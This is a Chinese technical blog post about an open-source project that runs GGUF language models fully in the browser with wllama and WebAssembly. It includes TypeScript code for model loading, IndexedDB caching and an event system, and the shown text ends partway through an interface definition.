.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>🌐 <strong>在线演示</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-ai-wllama.vercel.app%2F" target="_blank" title="https://mvp-ai-wllama.vercel.app/" ref="nofollow noopener noreferrer">mvp-ai-wllama.vercel.app/</a></p>
<p>🔗 <strong>GitHub仓库</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felectroluxcode%2Fmvp-ai-wllama" target="_blank" title="https://github.com/electroluxcode/mvp-ai-wllama" ref="nofollow noopener noreferrer">mvp-ai-wllama</a></p>
<p>说实话，第一次听说要在浏览器里跑大语言模型的时候，我的第一反应是：这怎么可能？不是需要 GPU 服务器吗？不是需要后端 API 吗？</p>
<p>但事实证明，wllama 的出现，真的让这一切变成了可能。于是就有了这个项目——一个完全在浏览器里运行的 AI 推理方案，不需要服务器，不需要后端，打开网页就能用。</p>
<h3 data-id="heading-1">腾讯混元翻译模型示例</h3>
<p>作为实际应用示例，本项目支持加载和运行 <a href="https://link.juejin.cn?target=https%3A%2F%2Fhf-mirror.com%2Fmradermacher%2FHY-MT1.5-1.8B-GGUF%2Ftree%2Fmain" target="_blank" title="https://hf-mirror.com/mradermacher/HY-MT1.5-1.8B-GGUF/tree/main" ref="nofollow noopener noreferrer">腾讯混元翻译模型（HY-MT1.5-1.8B-GGUF）</a>，这是一个专为多语言翻译任务设计的轻量级模型</p>
<p><strong>模型特点</strong>：</p>
<ul>
<li>🌍 <strong>多语言支持</strong>：支持 36 种语言的翻译任务</li>
<li>💬 <strong>对话式翻译</strong>：采用对话式交互，提供更自然的翻译体验</li>
<li>📦 <strong>多种量化版本</strong>：提供从 Q2_K（777MB）到 f16（3.59GB）的多种量化版本，满足不同性能和精度需求</li>
<li>⚡ <strong>轻量高效</strong>：1.8B 参数量，在保证翻译质量的同时，大幅降低了计算和存储需求</li>
</ul>
<p><strong>量化版本选择建议</strong>：</p>
<ul>
<li><strong>Q2_K（777MB）</strong>：适合快速测试和资源受限环境</li>
<li><strong>Q4_K_M（1.13GB）</strong>：平衡质量和性能的推荐选择</li>
<li><strong>Q5_K_M（1.3GB）</strong>：更高精度的翻译质量</li>
<li><strong>Q8_0（1.91GB）</strong>：接近原始精度的最佳选择</li>
</ul>
<p>step1: 下载模型</p>
<p>step2: 打开 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-ai-wllama.vercel.app%2Fwllama%2Fmanager-cache" target="_blank" title="https://mvp-ai-wllama.vercel.app/wllama/manager-cache" ref="nofollow noopener noreferrer">mvp-ai-wllama.vercel.app/wllama/mana…</a> 导入模型，
在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-ai-wllama.vercel.app%2Fwllama%2Fload-from-cache" target="_blank" title="https://mvp-ai-wllama.vercel.app/wllama/load-from-cache" ref="nofollow noopener noreferrer">mvp-ai-wllama.vercel.app/wllama/load…</a> 中就可以直接使用了(无视框架，只要能执行js就能够调用)</p>
<h2 data-id="heading-2">效果展示</h2>
<p>所有操作均在浏览器进行，先来看看最终效果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a03dc9743a74cfaa7063c9429a086b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxlY3Ryb2x1eA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768474563&amp;x-signature=hDqCJu6gF35%2BppSUG0Vn1dk%2F%2Ffk%3D" alt="纯前端.jpg" loading="lazy"/></p>
<h3 data-id="heading-3">为什么要做这个</h3>
<p>传统的 AI 模型推理，你懂的：</p>
<ul>
<li>得搞个 GPU 服务器，成本不低</li>
<li>后端服务部署，运维头疼</li>
<li>数据要传到服务器，隐私总让人担心</li>
<li>持续的服务成本，小项目根本玩不起</li>
</ul>
<p>而浏览器端推理就不一样了：</p>
<ul>
<li>用户的电脑就是"服务器"，零成本</li>
<li>数据完全本地处理，隐私安全</li>
<li>离线也能用，体验更好</li>
<li>部署简单，一个静态页面就能搞定</li>
</ul>
<p>所以，为什么不试试呢？</p>
<h3 data-id="heading-4">核心功能演示</h3>
<ul>
<li>✅ <strong>本地模型加载</strong>：支持从本地文件直接加载 GGUF 模型</li>
<li>✅ <strong>远程模型下载</strong>：从 URL 下载模型并自动缓存到 IndexedDB</li>
<li>✅ <strong>缓存管理</strong>：完整的模型缓存管理系统，支持导入、导出、删除</li>
<li>✅ <strong>流式生成</strong>：实时流式输出 AI 生成内容</li>
<li>✅ <strong>多线程支持</strong>：自动检测并使用多线程模式提升性能</li>
<li>✅ <strong>多实例支持</strong>：支持同时运行多个独立的模型实例，每个实例可加载不同模型</li>
<li>✅ <strong>参数持久化</strong>：推理参数自动保存到 localStorage</li>
<li>✅ <strong>事件驱动</strong>：完整的事件系统，支持监听模型加载、生成等事件</li>
<li>✅ <strong>类型安全</strong>：完整的 TypeScript 类型定义</li>
<li>✅ <strong>PWA 支持</strong>：完整的渐进式 Web 应用支持，可安装到设备，支持离线使用</li>
</ul>
<h2 data-id="heading-5">技术架构</h2>
<h3 data-id="heading-6">核心技术栈</h3>
<ul>
<li><strong>React 19</strong> + <strong>Next.js 15</strong>：现代化前端框架</li>
<li><strong>@wllama/wllama</strong>：基于 WebAssembly 的 Llama 模型运行时</li>
<li><strong>WebAssembly (WASM)</strong>：高性能模型推理引擎</li>
<li><strong>TypeScript</strong>：类型安全的开发体验</li>
<li><strong>IndexedDB</strong>：模型文件缓存系统</li>
<li><strong>EventEmitter</strong>：事件驱动的架构设计</li>
<li><strong>localStorage</strong>：推理参数持久化存储</li>
</ul>
<p>tip: 事实上核心库 <code>wllama-core</code> 不依赖于 React，你可以拿到项目中的 <code>src/wllama-core</code>，然后接入到任何系统中去，接入层可以参考 <code>src/app/wllama/load-from-file/page.tsx</code> 等应用层文件</p>
<h3 data-id="heading-7">架构流程图</h3>
<pre><code class="hljs language-python" lang="python">用户选择模型
    ↓
React组件层
    ↓
WllamaCore (核心封装层)
    ↓
<span class="hljs-meta">@wllama/wllama (<span class="hljs-params">WASM运行时</span>)</span>
    ↓
WebAssembly引擎
    ↓
GGUF模型文件
    ↓
IndexedDB缓存
    ↓
流式生成输出
</code></pre>
<h2 data-id="heading-8">WASM模型推理核心流程</h2>
<h3 data-id="heading-9">模型加载流程图解</h3>
<pre><code class="hljs language-markdown" lang="markdown">用户选择模型文件/URL
<span class="hljs-code">    ↓
检查缓存（如从URL加载）
    ↓
缓存命中 → 从IndexedDB读取
缓存未命中 → 下载/读取文件
    ↓
加载到WASM内存
    ↓
初始化模型参数
    ↓
模型就绪，可开始推理
</span></code></pre>
<h3 data-id="heading-10">核心代码实现</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/wllama-core/wllama-core.ts</span>

<span class="hljs-comment">/**
 * WllamaCore - 核心封装类，提供简洁的API
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WllamaCore</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">wllama</span>: <span class="hljs-title class_">Wllama</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">isModelLoaded</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">inferenceParams</span>: <span class="hljs-title class_">InferenceParams</span>;

  <span class="hljs-comment">/**
   * 从文件加载模型
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadModelFromFiles</span>(
    <span class="hljs-attr">files</span>: <span class="hljs-title class_">File</span>[],
    options?: <span class="hljs-title class_">LoadModelOptions</span>
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isModelLoaded</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">isGenerating</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Another model is already loaded or generation is in progress'</span>);
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADING</span>);
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> loadOptions = {
        <span class="hljs-attr">n_ctx</span>: options?.<span class="hljs-property">n_ctx</span> ?? <span class="hljs-variable language_">this</span>.<span class="hljs-property">inferenceParams</span>.<span class="hljs-property">nContext</span>,
        <span class="hljs-attr">n_batch</span>: options?.<span class="hljs-property">n_batch</span> ?? <span class="hljs-variable language_">this</span>.<span class="hljs-property">inferenceParams</span>.<span class="hljs-property">nBatch</span>,
        <span class="hljs-attr">n_threads</span>: options?.<span class="hljs-property">n_threads</span> ?? (<span class="hljs-variable language_">this</span>.<span class="hljs-property">inferenceParams</span>.<span class="hljs-property">nThreads</span> &gt; <span class="hljs-number">0</span> 
          ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">inferenceParams</span>.<span class="hljs-property">nThreads</span> 
          : <span class="hljs-literal">undefined</span>),
      };

      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">wllama</span>.<span class="hljs-title function_">loadModel</span>(files, loadOptions);

      <span class="hljs-comment">// 获取模型元数据</span>
      <span class="hljs-keyword">const</span> metadata = <span class="hljs-variable language_">this</span>.<span class="hljs-property">wllama</span>.<span class="hljs-title function_">getModelMetadata</span>();
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">modelMetadata</span> = {
        <span class="hljs-attr">name</span>: metadata.<span class="hljs-property">meta</span>[<span class="hljs-string">'general.name'</span>] || 
              metadata.<span class="hljs-property">meta</span>[<span class="hljs-string">'llama.context_length'</span>] || 
              files[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'.gguf'</span>, <span class="hljs-string">''</span>),
        ...metadata.<span class="hljs-property">meta</span>,
      };

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">isModelLoaded</span> = <span class="hljs-literal">true</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADED</span>, {
        <span class="hljs-attr">metadata</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">modelMetadata</span>,
        <span class="hljs-attr">runtimeInfo</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">runtimeInfo</span>,
      });
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resetInstance</span>();
      <span class="hljs-keyword">const</span> errorMsg = (error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>)?.<span class="hljs-property">message</span> ?? <span class="hljs-string">'Unknown error'</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">ERROR</span>, errorMsg);
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(errorMsg);
    }
  }

  <span class="hljs-comment">/**
   * 从URL加载模型（支持自动缓存）
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadModelFromUrl</span>(
    <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>,
    options?: <span class="hljs-title class_">LoadModelOptions</span> &amp; { 
      useCache?: <span class="hljs-built_in">boolean</span>;
      downloadOptions?: <span class="hljs-title class_">DownloadOptions</span>;
    }
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">const</span> useCache = options?.<span class="hljs-property">useCache</span> !== <span class="hljs-literal">false</span>; <span class="hljs-comment">// 默认启用缓存</span>

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">let</span> <span class="hljs-attr">file</span>: <span class="hljs-title class_">File</span>;

      <span class="hljs-comment">// 检查缓存</span>
      <span class="hljs-keyword">if</span> (useCache) {
        <span class="hljs-keyword">const</span> cachedFile = <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">open</span>(url);
        <span class="hljs-keyword">if</span> (cachedFile) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>?.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Loading model from cache:'</span>, url);
          file = cachedFile;
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// 下载并缓存</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>?.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Downloading and caching model:'</span>, url);
          <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">download</span>(url, options?.<span class="hljs-property">downloadOptions</span>);
          <span class="hljs-keyword">const</span> downloadedFile = <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">open</span>(url);
          <span class="hljs-keyword">if</span> (!downloadedFile) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Failed to open cached file after download'</span>);
          }
          file = downloadedFile;
        }
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 直接下载，不使用缓存</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url, {
          <span class="hljs-attr">headers</span>: options?.<span class="hljs-property">downloadOptions</span>?.<span class="hljs-property">headers</span>,
          <span class="hljs-attr">signal</span>: options?.<span class="hljs-property">downloadOptions</span>?.<span class="hljs-property">signal</span>,
        });
        <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">blob</span>();
        <span class="hljs-keyword">const</span> fileName = url.<span class="hljs-title function_">split</span>(<span class="hljs-string">'/'</span>).<span class="hljs-title function_">pop</span>() || <span class="hljs-string">'model.gguf'</span>;
        file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>([blob], fileName, { <span class="hljs-attr">type</span>: <span class="hljs-string">'application/octet-stream'</span> });
      }

      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadModelFromFiles</span>([file], options);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// 错误处理...</span>
    }
  }
}
</code></pre>
<h2 data-id="heading-11">缓存管理系统：IndexedDB实现</h2>
<p>项目采用 IndexedDB 实现模型文件的持久化缓存，支持大文件存储和快速检索：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/wllama-core/cache-manager.ts</span>

<span class="hljs-comment">/**
 * CacheManager - 基于 IndexedDB 的缓存管理器
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheManager</span> {
  <span class="hljs-comment">/**
   * 从URL下载并缓存模型文件
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">download</span>(<span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">options</span>: <span class="hljs-title class_">DownloadOptions</span> = {}): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">const</span> filename = <span class="hljs-keyword">await</span> <span class="hljs-title function_">urlToFileName</span>(url);

    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url, {
      <span class="hljs-attr">headers</span>: options.<span class="hljs-property">headers</span>,
      <span class="hljs-attr">signal</span>: options.<span class="hljs-property">signal</span>,
    });

    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Failed to fetch: <span class="hljs-subst">${response.statusText}</span>`</span>);
    }

    <span class="hljs-comment">// 流式读取并显示进度</span>
    <span class="hljs-keyword">const</span> reader = response.<span class="hljs-property">body</span>.<span class="hljs-title function_">getReader</span>();
    <span class="hljs-keyword">const</span> <span class="hljs-attr">chunks</span>: <span class="hljs-title class_">Uint8Array</span>[] = [];
    <span class="hljs-keyword">let</span> loaded = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> contentLength = response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'content-length'</span>);
    <span class="hljs-keyword">const</span> total = contentLength ? <span class="hljs-built_in">parseInt</span>(contentLength, <span class="hljs-number">10</span>) : <span class="hljs-number">0</span>;

    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
      <span class="hljs-keyword">const</span> { done, value } = <span class="hljs-keyword">await</span> reader.<span class="hljs-title function_">read</span>();
      <span class="hljs-keyword">if</span> (done) <span class="hljs-keyword">break</span>;
      chunks.<span class="hljs-title function_">push</span>(value);
      loaded += value.<span class="hljs-property">length</span>;
      <span class="hljs-keyword">if</span> (options.<span class="hljs-property">progressCallback</span> &amp;&amp; total &gt; <span class="hljs-number">0</span>) {
        options.<span class="hljs-title function_">progressCallback</span>({ loaded, total });
      }
    }

    <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>(chunks <span class="hljs-keyword">as</span> <span class="hljs-title class_">BlobPart</span>[]);
    <span class="hljs-keyword">const</span> db = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getDB</span>();

    <span class="hljs-comment">// 存储到 IndexedDB</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">cachedFile</span>: <span class="hljs-title class_">CachedFile</span> = {
      blob,
      <span class="hljs-attr">originalURL</span>: url,
      <span class="hljs-attr">createdAt</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
      <span class="hljs-attr">etag</span>: response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'etag'</span>) || <span class="hljs-literal">undefined</span>,
      <span class="hljs-attr">contentType</span>: response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'content-type'</span>) || <span class="hljs-literal">undefined</span>,
    };

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> transaction = db.<span class="hljs-title function_">transaction</span>([<span class="hljs-variable constant_">STORE_FILES</span>], <span class="hljs-string">'readwrite'</span>);
      <span class="hljs-keyword">const</span> fileStore = transaction.<span class="hljs-title function_">objectStore</span>(<span class="hljs-variable constant_">STORE_FILES</span>);
      fileStore.<span class="hljs-title function_">put</span>(cachedFile, filename);
      transaction.<span class="hljs-property">oncomplete</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>();
      transaction.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(transaction.<span class="hljs-property">error</span>);
    });
  }

  <span class="hljs-comment">/**
   * 从缓存打开文件
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">open</span>(<span class="hljs-attr">nameOrURL</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">File</span> | <span class="hljs-literal">null</span>&gt; {
    <span class="hljs-keyword">const</span> db = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getDB</span>();
    <span class="hljs-keyword">let</span> fileName = nameOrURL;

    <span class="hljs-comment">// 尝试直接使用名称</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> file = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getFileFromDB</span>(db, fileName);
      <span class="hljs-keyword">if</span> (file) <span class="hljs-keyword">return</span> file;
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-comment">// 尝试将URL转换为文件名</span>
      <span class="hljs-keyword">try</span> {
        fileName = <span class="hljs-keyword">await</span> <span class="hljs-title function_">urlToFileName</span>(nameOrURL);
        <span class="hljs-keyword">const</span> file = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getFileFromDB</span>(db, fileName);
        <span class="hljs-keyword">if</span> (file) <span class="hljs-keyword">return</span> file;
      } <span class="hljs-keyword">catch</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
      }
    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  }

  <span class="hljs-comment">/**
   * 列出所有缓存文件
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">list</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">CacheEntry</span>[]&gt; {
    <span class="hljs-keyword">const</span> db = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getDB</span>();
    <span class="hljs-keyword">const</span> allFiles = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAllFiles</span>(db);
    <span class="hljs-keyword">const</span> <span class="hljs-attr">result</span>: <span class="hljs-title class_">CacheEntry</span>[] = [];

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [fileName, cachedFile] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(allFiles)) {
      <span class="hljs-keyword">const</span> <span class="hljs-attr">metadata</span>: <span class="hljs-title class_">CacheEntryMetadata</span> = {
        <span class="hljs-attr">originalURL</span>: cachedFile.<span class="hljs-property">originalURL</span> || fileName,
      };
      
      <span class="hljs-comment">// 复制其他元数据字段</span>
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(cachedFile).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (key !== <span class="hljs-string">'blob'</span> &amp;&amp; key !== <span class="hljs-string">'originalURL'</span>) {
          metadata[key] = (cachedFile <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[key];
        }
      });
      
      result.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">name</span>: fileName,
        <span class="hljs-attr">size</span>: cachedFile.<span class="hljs-property">blob</span>.<span class="hljs-property">size</span>,
        metadata,
      });
    }

    <span class="hljs-keyword">return</span> result;
  }
}
</code></pre>
<p><strong>关键特性</strong>：</p>
<ul>
<li><strong>URL哈希映射</strong>：使用 SHA-1 哈希将 URL 转换为唯一文件名</li>
<li><strong>进度回调</strong>：支持下载进度实时反馈</li>
<li><strong>元数据扩展</strong>：可扩展的元数据结构，支持 ETag、创建时间等</li>
<li><strong>浏览器兼容</strong>：支持所有现代浏览器，包括较旧版本</li>
</ul>
<h2 data-id="heading-12">事件驱动架构：EventEmitter设计</h2>
<p>项目采用事件系统，实现组件间的松耦合通信：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/wllama-core/wllama-core.ts</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">WllamaCoreEvent</span> {
  <span class="hljs-variable constant_">MODEL_LOADING</span> = <span class="hljs-string">'model_loading'</span>,      <span class="hljs-comment">// 模型加载中</span>
  <span class="hljs-variable constant_">MODEL_LOADED</span> = <span class="hljs-string">'model_loaded'</span>,        <span class="hljs-comment">// 模型加载完成</span>
  <span class="hljs-variable constant_">MODEL_UNLOADED</span> = <span class="hljs-string">'model_unloaded'</span>,    <span class="hljs-comment">// 模型已卸载</span>
  <span class="hljs-variable constant_">GENERATION_START</span> = <span class="hljs-string">'generation_start'</span>, <span class="hljs-comment">// 生成开始</span>
  <span class="hljs-variable constant_">GENERATION_UPDATE</span> = <span class="hljs-string">'generation_update'</span>, <span class="hljs-comment">// 生成更新</span>
  <span class="hljs-variable constant_">GENERATION_END</span> = <span class="hljs-string">'generation_end'</span>,     <span class="hljs-comment">// 生成结束</span>
  <span class="hljs-variable constant_">ERROR</span> = <span class="hljs-string">'error'</span>,                       <span class="hljs-comment">// 错误</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WllamaCore</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">eventListeners</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">WllamaCoreEvent</span>, <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">EventListener</span>&gt;&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

  <span class="hljs-comment">/**
   * 注册事件监听器
   */</span>
  <span class="hljs-title function_">on</span>(<span class="hljs-params">event: WllamaCoreEvent, listener: EventListener</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">has</span>(event)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">set</span>(event, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">get</span>(event)!.<span class="hljs-title function_">add</span>(listener);
  }

  <span class="hljs-comment">/**
   * 移除事件监听器
   */</span>
  <span class="hljs-title function_">off</span>(<span class="hljs-params">event: WllamaCoreEvent, listener: EventListener</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">get</span>(event)?.<span class="hljs-title function_">delete</span>(listener);
  }

  <span class="hljs-comment">/**
   * 触发事件
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">emit</span>(<span class="hljs-params">event: WllamaCoreEvent, data?: <span class="hljs-built_in">unknown</span></span>) {
    <span class="hljs-keyword">const</span> listeners = <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">get</span>(event);
    <span class="hljs-keyword">if</span> (listeners) {
      listeners.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">listener</span>) =&gt;</span> <span class="hljs-title function_">listener</span>(data));
    }
  }
}
</code></pre>
<h3 data-id="heading-13">支持的事件类型</h3>
<ul>
<li><code>model_loading</code> - 模型加载中</li>
<li><code>model_loaded</code> - 模型加载完成</li>
<li><code>model_unloaded</code> - 模型已卸载</li>
<li><code>generation_start</code> - 生成开始</li>
<li><code>generation_update</code> - 生成更新（流式输出）</li>
<li><code>generation_end</code> - 生成结束</li>
<li><code>error</code> - 错误事件</li>
</ul>
<h3 data-id="heading-14">多实例事件系统</h3>
<p>在多实例模式下，所有事件数据都包含 <code>instanceId</code> 字段，用于区分不同实例的事件：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 监听特定实例的事件</span>
instance1.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADED</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'实例1模型已加载:'</span>, data.<span class="hljs-property">instanceId</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'模型元数据:'</span>, data.<span class="hljs-property">metadata</span>);
});

<span class="hljs-comment">// 监听所有实例的事件，通过 instanceId 区分</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUpdate</span> = (<span class="hljs-params">data: { data: <span class="hljs-built_in">string</span>; instanceId: <span class="hljs-built_in">string</span> }</span>) =&gt; {
  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">instanceId</span> === <span class="hljs-string">'chat-1'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'聊天1更新:'</span>, data.<span class="hljs-property">data</span>);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">instanceId</span> === <span class="hljs-string">'chat-2'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'聊天2更新:'</span>, data.<span class="hljs-property">data</span>);
  }
};

instance1.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, handleUpdate);
instance2.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, handleUpdate);
</code></pre>
<p><strong>事件数据结构</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 所有事件数据都包含 instanceId</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">BaseEventData</span> {
  <span class="hljs-attr">instanceId</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// 模型加载事件</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ModelLoadedEventData</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseEventData</span> {
  <span class="hljs-attr">metadata</span>: <span class="hljs-title class_">ModelMetadata</span>;
